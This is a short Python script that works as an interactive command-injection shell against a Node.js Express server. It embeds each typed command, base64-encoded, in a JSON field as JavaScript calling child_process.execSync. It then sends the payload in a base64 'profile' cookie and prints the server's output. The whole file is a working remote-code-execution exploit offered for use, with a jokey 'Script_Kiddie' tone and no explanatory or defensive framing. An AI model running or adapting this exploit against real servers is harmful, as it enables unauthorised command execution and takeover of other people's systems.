#!/usr/env/python
# -*- encoding: utf8 -*-

try:
  import requests, urllib, base64, sys
except:
  print("You need requests, urllib and base64 modules to execute this script")
  exit(1)

if len(sys.argv) != 3:
  print("Usage: python %s <express_server_ip> <server_port>" % sys.argv[0])
  exit(1)

try:
    while True:
        command = raw_input('Type your injection, pal > ')
        commandb64 = base64.b64encode(command)

        profile = ("{\"username\":\"Script_Kiddie\", \"num\":\"7; var buf = new Buffer('%s', 'base64'); var inyection = require('child_process').execSync(buf); res.end(inyection);\"}" % commandb64)

        url = ('http://%s:%s/' % (sys.argv[1], sys.argv[2]))
        profile = urllib.quote_plus(base64.b64encode(profile))
        cookie = dict(profile=profile)

        req = requests.get(url, cookies=cookie)

        print("\n")

        if req.status_code == 200:
            response = req.text.replace("<br>", "\n")
            response = response.replace("<pre>", "")
            response = response.replace("&nbsp;", " ")
            print("======================= %s =========================" % command)
            print response
            print("=====================================================\n")
        else:
            response = req.text.replace("<br>", "\n")
            response = response.replace("<pre>", "")
            response = response.replace("&nbsp;", " ")
            print("\n[*** ERROR] The query returned an error: %d - %s\n\n%s\n" % (req.status_code, req.reason, response))

        print("\n\nCtrl-C to exit")
except KeyboardInterrupt:
    print("\n\nOlrait, my work is done here...\n")
